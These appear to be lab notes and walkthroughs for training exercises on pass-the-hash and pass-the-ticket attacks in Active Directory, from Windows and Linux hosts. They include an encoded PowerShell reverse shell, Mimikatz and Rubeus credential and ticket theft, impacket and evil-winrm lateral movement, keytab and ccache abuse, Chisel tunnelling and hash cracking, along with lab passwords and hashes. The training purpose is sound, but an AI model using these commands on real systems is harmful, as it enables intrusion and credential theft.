ZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=

ipconfig
Ethernet adapter Ethernet1 2:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::e005:2b92:a308:2551%13
   IPv4 Address. . . . . . . . . . . : 172.16.1.5
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.1.1

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   IPv4 Address. . . . . . . . . . . : 10.129.204.23
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.129.0.1


cd C:\tools\Invoke-TheHash
Import-Module .\Invoke-TheHash.psd1
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgAxAC4ANQAiACwAOAAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="

# Again on the lvnp 8001
type C:\julio\flag.txt
JuL1()_N3w_fl@g
```





```cmd
mimikatz.exe privilege::debug sekurlsa::logonpasswords exit

# John's Hash
c4b0e1b10c7ce2c4723b4e2407ef81a2

impacket-psexec john@10.129.204.23 -hashes :c4b0e1b10c7ce2c4723b4e2407ef81a2
(same syntax works with impacket-wmiexec, impacket-atexec, impacket-smbexec)


python3 psexec.py john@10.129.204.23 -hashes :c4b0e1b10c7ce2c4723b4e2407ef81a2 

Impacket v0.14.0.dev0+20260619.174856.9a5621d4 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.204.23.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
```

```cmd
evil-winrm -i 10.129.204.23 -u john -H c4b0e1b10c7ce2c4723b4e2407ef81a2
```



# Pass the Ticket (PtT) from Windows

Moving laterally with a stolen Kerberos ticket instead of an NTLM hash. Since you just finished the PtH/john exercise, note the shift: PtH abuses NTLM, PtT abuses Kerberos. Different auth mechanism, different artifacts.

Kerberos is a network authentication protocol designed to verify the identity of the user or host.

## Kerberos refresher (the mental model you need)

The whole point of Kerberos is to avoiod handing your password to every service. You authenticate once to the KDC (on the DC) by encrypting a timestamp with your password hash; it hands you a TGT (Ticket Granting Ticket). From then on, you present the TGT to request TGS (service tickets) for specific resources. A TGT lets you request tickets for anything you're authorized for; a TGS is scoped to one service.

## Harvesting tickets (needs local admin for all tickets)

Tickets live in LSASS. Two tools:

- `mimikatz sekurlsa::tickets /export` -> writes `.kirbi` files to disk. Naming: computer-account tickets end in `$`; the `krbtgt` service in a filename means it's a TGT.
- `Rubeus.exe dump /nowrap` -> prints tickets as base64 instead of files (`/nowrap` for clean copy-paste).



## Pass the Key / OverPass the Hash

This is the bridge between hashes and tickets: take a user's Kerberos key (rc4/aes128/aes256) and forge a full TGT from it.

- Dump keys: `mimikatz sekurlsa::ekeys`
- Forge: `mimikatz sekurlsa::pth /user:.. /ntlm:..` or `Rubeus.exe asktgt /user:.. /aes256:.. /nowrap`

Key distinction to write down: Mimikatz needs admin; Rubeus `asktgt` does not. Also, using an rc4 (NTLM) key in a modern AES domain can trip an "encryption downgrade" detection, so prefer aes256 when you have it.

## Actually passing the ticket

Several routes, all landing at "import ticket -> access resource":

- `Rubeus.exe asktgt ... /ptt`: forge and inject in one step
- `Rubeus.exe ptt /ticket:<file.kirbi>` or `/ticket:<base64>`: inject an existing ticket
- `mimikatz kerberos::ptt <file.kirbi>`: same via Mimikatz
- Convert a `.kirbi` to base64 in PowerShell with `[Convert]::ToBase64String([IO.File]::ReadAllBytes("..."))`

Success looks like `Ticket successfully imported!`, after which `dir \\DC01.inlanefreight.htb\c$` works.

## PtT + PowerShell Remoting (this ties directly to your john exercise)

If a user is in Remote Management Users but not admin, exactly john's situation from the last task - you can PtT then `Enter-PSSession - ComputerName DC01`. Two setups shown:

- Mimikatz: `kerberos::ptt` <john.kirbi> -> launch `powershell` -> `Enter-PSSession`
- Rubeus: `createnetonly /program:cmd.exe /show` (spins up a sacrificial logon session so you don't clobber yoyr current TGTs) -> in that window `asktgt /user:john ... /ptt` -> `Enter-PSSession`

PtT is the Kerberos cousin of PtH. Getting a ticket = harvest an existing one (`sekurlsa::tickets`/`Rubeus dump`) or forge one from a key (OverPass the Hash via `ekeys` -> `asktgt`). Using it = `ptt` in any of the three tools. And the recurring privilege lesson from your john exercise reappears here: Remote Management Users membership -> PowerShell Remoting works without admin, which is exactly what makes the `Enter-PSSession` path viable.

## Commands



### Harvesting tickets (need local admin for all users' tickets)



#### Mimikatz - export tickets to `.kirbi` files

```bash
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
exit

dir *.kirbi
```



#### Rubeus - dump tickets as base64

```bash
Rubeus.exe dump /nowrap
```



### Pass the Key / OverPass the Hash



#### Extract Kerberos encryption keys (Mimikatz)

```bash
mimikatz.exe
privilege::debug
sekurlsa::ekeys
```



#### Forge TGT from a hash/key - Mimikatz (needs admin)

```bash
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```



#### Forge TGT from a key - Rubeus (no admin needed)

```bash
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:<AES256_KEY> /nowrap
```



### Pass the Ticket (import + use)



#### Rubeus - forge and inject in one step

```bash
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:<RC4_HASH> /ptt
```



#### Rubeus - inject an existing ticket (file or base64)

```bash
Rubeus.exe ptt /ticket:<ticket.kirbi>
Rubeus.exe ptt /ticket:<BASE64_TICKET>
```



#### Mimikatz - inject a `.kirbi`

```bash
mimikatz.exe
privilege::debug
kerberos::ptt "C:\path\to\ticket.kirbi"
exit
```



#### Convert `.kirbi` -> base64 (PowerShell)

```bash
[Convert]::ToBase64String([IO.File]::ReadAllBytes("<ticket.kirbi>"))
```



#### Verify the ticket works

```bash
dir \\DC01.inlanefreight.htb\c$
```



### PtT + PowerShell Remoting (Remote Management Users, no admin)



#### Mimikatz route

```bash
mimikatz.exe
privilege::debug
kerberos::ptt "C:\path\to\john.kirbi"
exit

powershell
Enter-PSSession -ComputerName DC01
```



#### Rubeus route (sacrificial logon session)

```bash
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

Then in the new `cmd` window

```bash
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:<AES256_KEY> /ptt

powershell
Enter-PSSession -ComputerName DC01
```

- `/nowrap` (Rubeus) keeps base64 on one line for clean copy-paste
- `/ptt` injects directly into your current session vs. `dump`/`export` which just retrieves.
- `createnetonly` matters when you don't want to overwrite the TGTs already in your logon session - it spins up a throwaway one (LOGON_TYPE 9) instead. And the privilege split worth memorizing: Mimikatz needs admin, Rubeus `asktgt` doesn't.



## Connect to HTB



#### Connect to the target machine using RDP and the provided creds. Export all tickets present on the computer. How many users TGT did you collect?

```bash
xfreerdp /v:10.129.204.23 /u:Administrator /p:'AnotherC0mpl3xP4$$' /cert:ignore +auto-reconnect /timeout:20000
```

```cmd
cd C:\tools
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
exit

dir *.kirbi
```

3

#### Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder DC01.inlanefreight.htb\john

The Group headings are the key. Mimikatz sorts every account's tickets into groups:

- Group 0 - Ticket Granting Service: These are TGS (service tickets). Everything under here in your paste is `cifs`, `LDAP`, `ldap` - service tickets for reaching specific services on DC01. Not TGTs.
- Group 2 - Ticket Granting Ticket -> These are the TGTs. That heading is literally telling you.

```cmd
Authentication Id : 0 ; 306344 (00000000:0004aca8)
Session           : Service from 0
User Name         : john
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 7/22/2026 4:39:37 PM
SID               : S-1-5-21-3325992272-2815718403-617452758-1108

         * Username : john
         * Domain   : INLANEFREIGHT.HTB
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 7/22/2026 4:39:52 PM ; 7/23/2026 2:39:52 AM ; 7/29/2026 4:39:52 PM
           Service Name (02) : krbtgt ; INLANEFREIGHT.HTB ; @ INLANEFREIGHT.HTB
           Target Name  (02) : krbtgt ; INLANEFREIGHT ; @ INLANEFREIGHT.HTB
           Client Name  (01) : john ; @ INLANEFREIGHT.HTB ( INLANEFREIGHT )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             2a1f8e1062930e2f8e6af224d55c0378420c73e4984e13db424242fc70c0022f
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;4aca8]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi !
```

```cmd
mimikatz.exe
privilege::debug
kerberos::ptt "C:\tools\[0;4aca8]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
exit
```

```cmd
dir \\DC01.inlanefreight.htb\john
type \\DC01.inlanefreight.htb\john\john.txt
Learn1ng_M0r3_Tr1cks_with_J0hn
```



#### Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt

```cmd
mimikatz.exe
privilege::debug
kerberos::ptt "C:\tools\[0;4aca8]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
exit

powershell

Enter-PSSession -ComputerName DC01

whoami
type C:\john\john.txt
P4$$_th3_Tick3T_PSR
```



#### Optional: Try to use both tools, Mimikatz and Rubeus, to perform the attacks without relying on each other. Mark DONE when finish.

```cmd
Rubeus.exe dump /nowrap

 UserName                 : john
  Domain                   : INLANEFREIGHT
  LogonId                  : 0x4aca8
  UserSID                  : S-1-5-21-3325992272-2815718403-617452758-1108
  AuthenticationPackage    : Kerberos
  LogonType                : Service
  LogonTime                : 7/22/2026 4:39:37 PM
  LogonServer              : DC01
  LogonServerDNSDomain     : INLANEFREIGHT.HTB
  UserPrincipalName        : john@inlanefreight.htb


    ServiceName              :  krbtgt/INLANEFREIGHT.HTB
    ServiceRealm             :  INLANEFREIGHT.HTB
    UserName                 :  john
    UserRealm                :  INLANEFREIGHT.HTB
    StartTime                :  7/22/2026 4:39:52 PM
    EndTime                  :  7/23/2026 2:39:52 AM
    RenewTill                :  7/29/2026 4:39:52 PM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  Kh+OEGKTDi+OavIk1VwDeEIMc+SYThPbQkJC/HDAAi8=
    Base64EncodedTicket   :

      doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRCoiYwJKADAgECoR0wGxsGa3JidGd0GxFJTkxBTkVGUkVJR0hULkhUQqOCBFAwggRMoAMCARKhAwIBAqKCBD4EggQ6jZ/6a01kF0wAH2mnh3oDBnyLdBTBXyC+CH39adAw+kq2J0lQphI1hus8nx0cCf0kwtEF07OkMduiFJWVfBLhodZmF7ywV5mlP7Eod1deb2VK0ay3ko8YFqpf7HLUIZbg4mZXkIPEUHqQXYd/DTbkkKmgXZZpnRt29w1Kng2bt7AxH0DDBjQm9DSWj49N73MRuk3jU9jPtTV74zG2Gnv0s/8/UuhYzgLGpNkXOFNegR1KWZUTLv4I/TcvGj3OiSg1b6P1BxVwG5OMjFQF9dgKjV5EMuyX6689mmdbfr84d8URcSa71yiRs2OZbHOEHyzPk6cKcjCk+qsrfWB1ARtKUbxS5MfgLAoUpiPzBH5QjfVTTpsdPWq1nx7m3WXFKpdZKfL3F09l+LSXAwq/pidIH+m2np+iulpjsCMQ8fdiMUTf/DFxjt5F/P849OUMs2F8JLEP/7jbE0zzGCa42BCRt3pBFtasw60r/n7YNJg6DmDsR7xCh2ggKm9HMmAHAuRNx9As9oDVKZ4/lQo3c4fkdDbo8hAnwRd+YYS6W6gV02j6XqhchtzPEmgz55pLhnXD4LiuKF8RR9y4OYGq0rt2rChkgw6I7SDnIP/Yge/aCUNoNw5niX/3iQBxFzoJlCB0VtxwmY13tcEQQIrpNyVDwJs3bL9RC/hFjnuO+7YPqW/refL1A+ozdQAEwycwUGEp8YE1W3YBatjp24jrU4grAH5+TgzKFMsE1DYQRI5aOYBOnfcWr8dewGEBzVDZdJAKeLOIwkm+1hDcN4ysl/uGi7j/SBf6HhLjydaAMwCoAsdhF/N4oOFIge8XxTQItWJIT1zfvndJzALKIhohzWWRD5GVj++8x22Vm5yt687EDAsQ+w2V+FbjLMxATco8jvRDXvDTBEsrG1zKXDF/yequ3jZbM4T4UdLGCkT9KFuVLqq2GD96F38Ruu0V+2SqzGChTDkAt6W73fnT/ssFlxZSWUCkeU79rUhlH8MWi9z5dSiZ0PC1eIB86TnpbrvJR2XdwLehPjqnU4lAucSBreIszs12xYODj/hoC0zvRh37Q+3AssRJpP3mdvavlW7ZrjgJiG7nJFJ9t09fznYLVk/+PmiJJPgp+c4Qcm9QAI6aKICdXNQjA7jNDa1QBmZ1iecCiZTmrKf5MWw2PrTeT4so07LuqXQsQ7VdtrKRAzVDDtotgKn1sheNeyEjA3o0Q2tMWuE/pTlfYsXex5IQp2vmG1dAGjNkM662rp1z6A8puZ2XE0npik2884dXqfLM6eVegfZvLvJkX1cG8uyns2hCHOgBGVz29DlYP0s4VgMDH413BDoN2QFFGv/Qc5GChQ35sXikYG/GCay2rbgjcZiOIc4E6jTAErXEmsK+qCbYdm9XkduOr3Y9duGl5oP0LJbQHJdabJEBFwy2CKjq9ayiqq7u23v3bgmhSqSjgfEwge6gAwIBAKKB5gSB432B4DCB3aCB2jCB1zCB1KArMCmgAwIBEqEiBCAqH44QYpMOL45q8iTVXAN4Qgxz5JhOE9tCQkL8cMACL6ETGxFJTkxBTkVGUkVJR0hULkhUQqIRMA+gAwIBAaEIMAYbBGpvaG6jBwMFAEDhAAClERgPMjAyNjA3MjIyMTM5NTJaphEYDzIwMjYwNzIzMDczOTUyWqcRGA8yMDI2MDcyOTIxMzk1MlqoExsRSU5MQU5FRlJFSUdIVC5IVEKpJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEUlOTEFORUZSRUlHSFQuSFRC

Rubeus.exe ptt /ticket:doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRCoiYwJKADAgECoR0wGxsGa3JidGd0GxFJTkxBTkVGUkVJR0hULkhUQqOCBFAwggRMoAMCARKhAwIBAqKCBD4EggQ6jZ/6a01kF0wAH2mnh3oDBnyLdBTBXyC+CH39adAw+kq2J0lQphI1hus8nx0cCf0kwtEF07OkMduiFJWVfBLhodZmF7ywV5mlP7Eod1deb2VK0ay3ko8YFqpf7HLUIZbg4mZXkIPEUHqQXYd/DTbkkKmgXZZpnRt29w1Kng2bt7AxH0DDBjQm9DSWj49N73MRuk3jU9jPtTV74zG2Gnv0s/8/UuhYzgLGpNkXOFNegR1KWZUTLv4I/TcvGj3OiSg1b6P1BxVwG5OMjFQF9dgKjV5EMuyX6689mmdbfr84d8URcSa71yiRs2OZbHOEHyzPk6cKcjCk+qsrfWB1ARtKUbxS5MfgLAoUpiPzBH5QjfVTTpsdPWq1nx7m3WXFKpdZKfL3F09l+LSXAwq/pidIH+m2np+iulpjsCMQ8fdiMUTf/DFxjt5F/P849OUMs2F8JLEP/7jbE0zzGCa42BCRt3pBFtasw60r/n7YNJg6DmDsR7xCh2ggKm9HMmAHAuRNx9As9oDVKZ4/lQo3c4fkdDbo8hAnwRd+YYS6W6gV02j6XqhchtzPEmgz55pLhnXD4LiuKF8RR9y4OYGq0rt2rChkgw6I7SDnIP/Yge/aCUNoNw5niX/3iQBxFzoJlCB0VtxwmY13tcEQQIrpNyVDwJs3bL9RC/hFjnuO+7YPqW/refL1A+ozdQAEwycwUGEp8YE1W3YBatjp24jrU4grAH5+TgzKFMsE1DYQRI5aOYBOnfcWr8dewGEBzVDZdJAKeLOIwkm+1hDcN4ysl/uGi7j/SBf6HhLjydaAMwCoAsdhF/N4oOFIge8XxTQItWJIT1zfvndJzALKIhohzWWRD5GVj++8x22Vm5yt687EDAsQ+w2V+FbjLMxATco8jvRDXvDTBEsrG1zKXDF/yequ3jZbM4T4UdLGCkT9KFuVLqq2GD96F38Ruu0V+2SqzGChTDkAt6W73fnT/ssFlxZSWUCkeU79rUhlH8MWi9z5dSiZ0PC1eIB86TnpbrvJR2XdwLehPjqnU4lAucSBreIszs12xYODj/hoC0zvRh37Q+3AssRJpP3mdvavlW7ZrjgJiG7nJFJ9t09fznYLVk/+PmiJJPgp+c4Qcm9QAI6aKICdXNQjA7jNDa1QBmZ1iecCiZTmrKf5MWw2PrTeT4so07LuqXQsQ7VdtrKRAzVDDtotgKn1sheNeyEjA3o0Q2tMWuE/pTlfYsXex5IQp2vmG1dAGjNkM662rp1z6A8puZ2XE0npik2884dXqfLM6eVegfZvLvJkX1cG8uyns2hCHOgBGVz29DlYP0s4VgMDH413BDoN2QFFGv/Qc5GChQ35sXikYG/GCay2rbgjcZiOIc4E6jTAErXEmsK+qCbYdm9XkduOr3Y9duGl5oP0LJbQHJdabJEBFwy2CKjq9ayiqq7u23v3bgmhSqSjgfEwge6gAwIBAKKB5gSB432B4DCB3aCB2jCB1zCB1KArMCmgAwIBEqEiBCAqH44QYpMOL45q8iTVXAN4Qgxz5JhOE9tCQkL8cMACL6ETGxFJTkxBTkVGUkVJR0hULkhUQqIRMA+gAwIBAaEIMAYbBGpvaG6jBwMFAEDhAAClERgPMjAyNjA3MjIyMTM5NTJaphEYDzIwMjYwNzIzMDczOTUyWqcRGA8yMDI2MDcyOTIxMzk1MlqoExsRSU5MQU5FRlJFSUdIVC5IVEKpJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEUlOTEFORUZSRUlHSFQuSFRC

powershell
Enter-PSSession -ComputerName DC01
whoami
type C:\john\john.txt
```



# Pass the Ticket (PtT) from Linux



## Overview

Linux machines can join Active Directory for centralized identity management, typically using Kerberos for authentication. If you compromise a domain-joined Linux machine, you can hunt for Kerberos tickets to impersonate other users and expand access. A machine doesn't strictly need to be domain-joined to use Kerberos tickets.

## Kerberos on Linux

Windows and Linux use the same process to request TGTs and TGSs, but storage differs:

- ccache files: Stored in `/tmp` by default. Location set in `KRB5CCNAME` environment variable. Protected by read/write permissions -- root or privileged users can access them. 
- keytab files: Contain pairs of Kerberos principals and encrypted keys (derived from the password). Allow passwordless authentication, often used in scripts/cronjobs. Must be recreated when the password changes. Portable across machines.



## Scenario

`LINUX01` is domain-joined and reachable only through `MS01`. Access via RDP->SSH, or port forward (TCP/2222 on MS01 -> TCP/22 on LINUX01). Given credentials: `david@inlanefreight.htb`/`Password2`.

```bash
ssh david@inlanefreight.htb@10.129.204.23 -p 2222
```



### Identifying Linux and Active Directory integration

```bash
realm list
```

Confirms Kerberos membership, domain name, and permitted logins/groups. If `realm` is unavailable, check for `sssd`/`winbind` services:

```bash
ps -ef | grep -i "winbind\|sssd"
```



### Finding Kerberos tickets in Linux



#### Finding KeyTab files:

```bash
find / -name *keytab* -ls 2>/dev/null
```

You need read and write privileges to use a keytab. Also check cronjobs for scripts using keytabs:

```bash
crontab -l
cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
```

Scripts using `kinit` indicate Kerberos in use (`kinit` requests the TGT and stores it in cache). The default machine keytab is `/etc/krb5.keytab` (root-only) - access it to impersonate `LINUX01$`.

#### Finding ccache files:

```bash
env | grep -i krb5
ls -la /tmp
```



### Abusing KeyTab files

List keytab contents to find the principal:

```bash
klist -k -t /opt/specialfiles/carlos.keytab
```

Impersonate the user (`kinit` is case-sensitive -- match the principal exactly):

```bash
klist
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
klist
```

Verify access:

```bash
smbclient //dc01/carlos -k -c ls
```



### KeyTab Extract

Extract hashes (realm, SPN, encryption type, hashes) from a keytab with KeyTabExtract:

```bash
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```

This yields NTLM (for Pass the Hash), AES-256, and AES-128 hashes. NTLM is easiest to crack -- use Hashcat, John, or CrackStation. Then log in:

```bash
su - carlos@inlanefreight.htb
```



### Obtaining more hashes

Repeat the process on other keytabs found in cronjobs (e.g., `svc_workstations.kt`) to crack passwords and pivot to more accounts.

## Abusing KeyTab ccache

ccache files need only read privileges but are readable only by their owner -- unless you're root. After gaining `svc_workstations`, check privileges and escalate:

```bash
sudo -l
sudo su
```

As root, enumerate tickets:

```bash
ls -la /tmp
```

Check group membership of unaccessed users:

```bash
id julio@inlanefreight.htb
```

If a user is in Domain Admins, import their ccache file:

```bash
klist
cp /tmp/krb5cc_647401106_I8I133 .
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
klist
smbclient //dc01/C$ -k -c ls -no-pass
```

Watch the valid starting / expires values -- expired tickets won't work.

## Using Linux attack tools with Kerberos

Ensure `KRB5CCNAME` points to the desired ccache. From a non-domain attack host, you must reach the KDC/DC and have working name resolution. Here, proxy traffic through MS01 with Chisel + Proxychains, and hardcode `/etc/hosts`.

```bash
cat /etc/hosts

cat /etc/proxychains.conf	# socks5 127.0.0.1 1080
```

Set up Chisel:

```bash
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gzip -d chisel_1.7.7_linux_amd64.gz
mv chisel_* chisel && chmod +x ./chisel
sudo ./chisel server --reverse
```

Connect to Ms01 and run the client:

```bash
xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution

c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
```

Transfer Julio's ccache and set the variable:

```bash
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

Impacket (use target machine name, `-k`, and `-no-pass` if prompted):

```bash
proxychains impacket-wmiexec dc01 -k
```

Evil-WinRM (install `krb5-user`, realm `INLANEFREIGHT.HTB`, KDC `DC01`):

```bash
sudo apt-get install krb5-user -y
```

If already installed, edit `/etc/krb5.conf`:

```bash
cat /etc/krb5.conf
# [libdefaults] default_realm = INLANEFREIGHT.HTB
# [realms] INLANEFREIGHT.HTB = { kdc = dc01.inlanefreight.htb }
```

```bash
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```



## Miscellaneous

Convert between ccache (Linux) and kirbi (Windows) formats:

```bash
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```

Import a kirbi on Windows with Rubeus:

```bash
C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
klist
dir \\dc01\julio
```



## Linikatz

A Cisco tool bringing Mimikatz-style credential extrction to UNIX. Requires root. Extracts credentials/tickets from FreeIPA, SSSD, Samba, Vintella, etc., dumping them (in ccache and keytab formats) into a `linikatz.*` folder for reuse.

```bash
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
/opt/linikatz.sh
```



## Key takeaways

The workflow is find tickets (keytab/ccache) -> impersonate via `kinit` or `KRB5CCNAME` -> extract/crack hashes for lateral movement -> escalate to root to steal others' ccache -> pivot to Domain Admin. The recurring pattern is that root access unlocks every ccache in `/tmp`, and keytabs are your route to crackable hashes.

## Connect to HTB



#### Connect to the target machine using SSH to the port TCP/2222 and the provided credentials. Read the flag in David's home directory.

```bash
ssh david@inlanefreight.htb@10.129.204.23 -p 2222
cat flag.txt
Gett1ng_Acc3$$_to_LINUX01
```



#### Which group can connect to LINUX01?

```bash
realm list

inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@inlanefreight.htb
  login-policy: allow-permitted-logins
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins

Linux Admins
```



#### Look for a keytab file that you have read and write access. Submit the file name as a response.

```bash
find / -name *keytab* -ls 2>/dev/null

   287437      4 -rw-r--r--   1 root     root         2110 Aug  9  2021 /usr/lib/python3/dist-packages/samba/tests/dckeytab.py
   288276      4 -rw-r--r--   1 root     root         1871 Oct  4  2022 /usr/lib/python3/dist-packages/samba/tests/__pycache__/dckeytab.cpython-38.pyc
   287720     24 -rw-r--r--   1 root     root        22768 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/ldb/update_keytab.so
   286812     28 -rw-r--r--   1 root     root        26856 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/libnet-keytab.so.0
   131610      4 -rw-------   1 root     root         2694 Jul 23 13:39 /etc/krb5.keytab
   262464     12 -rw-r--r--   1 root     root        10015 Oct  4  2022 /opt/impacket/impacket/krb5/keytab.py
   262184      4 -rw-rw-rw-   1 root     root          216 Jul 23 14:05 /opt/specialfiles/carlos.keytab
   131201      8 -rw-r--r--   1 root     root         4582 Oct  6  2022 /opt/keytabextract.py
   287958      4 drwx------   2 sssd     sssd         4096 Jun 21  2022 /var/lib/sss/keytabs
   398204      4 -rw-r--r--   1 root     root          380 Oct  4  2022 /var/lib/gems/2.7.0/doc/gssapi-1.3.1/ri/GSSAPI/Simple/set_keytab-i.ri

# The only file that has `-rw-rw-rw-` /opt/specialfiles/carlos.keytab
klist -k -t /opt/specialfiles/carlos.keytab

Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   1 07/23/2026 14:10:01 carlos@INLANEFREIGHT.HTB
   1 07/23/2026 14:10:01 carlos@INLANEFREIGHT.HTB
   1 07/23/2026 14:10:01 carlos@INLANEFREIGHT.HTB

klist
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
klist

smbclient //dc01/carlos -k -c ls

python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 

[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
	REALM : INLANEFREIGHT.HTB
	SERVICE PRINCIPAL : carlos/
	NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
	AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
	AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4

a738f92b3c08b424ec2d99589a9cce60 -> NTLM

hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt

a738f92b3c08b424ec2d99589a9cce60:Password5                
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: a738f92b3c08b424ec2d99589a9cce60
Time.Started.....: Thu Jul 23 10:28:45 2026 (0 secs)
Time.Estimated...: Thu Jul 23 10:28:45 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
